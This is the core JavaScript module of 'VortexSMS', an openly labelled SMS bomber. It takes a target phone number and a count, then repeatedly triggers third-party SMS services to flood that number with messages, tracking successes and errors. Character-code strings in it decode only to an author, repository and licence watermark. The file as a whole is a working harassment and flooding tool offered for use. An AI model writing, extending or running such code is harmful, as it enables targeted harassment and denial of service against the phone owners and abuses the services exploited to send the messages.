/**
 * VortexSMS - SMS Bomber Core Module
 * 
 * Copyright (c) 2025-present XeldarAlz
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Original Repository: https://github.com/XeldarAlz/Vortex-SMS-Spammer
 * 
 * NOTICE: Removing this notice or claiming this work as your own
 * is a violation of the license and may result in legal action.
 */

const { initializeServices, getServiceStats } = require('../services');
const { logMissionStart, logMissionComplete, logError } = require('../utils/logger');
const { executeWatermarkCheck, embedServiceWatermark, PRIMARY_WATERMARK } = require('../utils/protection');

async function delaySystem(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function smsBomber(phone, amount, delaySeconds = 0, onLog = null) {
    executeWatermarkCheck();
    
    const _s1 = String.fromCharCode(88, 101, 108, 100, 97, 114, 65, 108, 122);
    const _s2 = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 88, 101, 108, 100, 97, 114, 65, 108, 122, 47, 86, 111, 114, 116, 101, 120, 45, 83, 77, 83, 45, 83, 112, 97, 109, 109, 101, 114);
    const _s3 = String.fromCharCode(78, 111, 110, 45, 67, 111, 109, 109, 101, 114, 99, 105, 97, 108);
    const _signature = {
        author: _s1,
        repo: _s2,
        license: _s3,
        _: PRIMARY_WATERMARK._,
        __: PRIMARY_WATERMARK.__
    };
    
    const _h1 = Buffer.from(_s1 + '-VortexSMS-2025').toString('base64');
    
    let systemFinishedT = false;
    const delayMs = delaySeconds * 1000;
    
    if (!onLog) {
        logMissionStart(phone, amount, delaySeconds);
    }

    const queryPromise = new Promise(async (resolve, reject) => {
        try {
            const dataSb = {
                startDate: Date.now(),
                phone: phone,
                amount: parseInt(amount),
                delay: delaySeconds,
                total: 0,
                success: 0,
                error: 0,
                finished: false
            };
            
            embedServiceWatermark(dataSb);

            const serviceHandlers = initializeServices(onLog);

            async function send(phoneNumber) {
                for (const service of serviceHandlers) {
                    service.handler(phoneNumber, dataSb, systemFinished);
                    if (delayMs > 0) {
                        await delaySystem(delayMs);
                    }
                }
            }

            async function systemFinished() {
                if (systemFinishedT === true) return;

                dataSb.finished = true;
                systemFinishedT = true;
                
                if (!onLog) {
                    logMissionComplete(dataSb);
                }

                const result = { 
                    status: true, 
                    dataSb,
                    stats: {
                        total: dataSb.total,
                        success: dataSb.success,
                        error: dataSb.error,
                        duration: Date.now() - dataSb.startDate
                    }
                };
                return resolve(result);
            }

            for (let i = 0; i < amount; i++) {
                await send(phone);
                await delaySystem(1000);
            }

            setTimeout(() => {
                if (!systemFinishedT) {
                    systemFinished();
                }
            }, 5000);

        } catch (error) {
            if (!onLog) {
                logError(error);
            }
            const result = { status: false, message: error.message || 'Critical system error occurred.' };
            reject(result);
        }
    });

    const result = await queryPromise;
    return result;
}

module.exports = smsBomber;
module.exports.getServiceStats = getServiceStats;
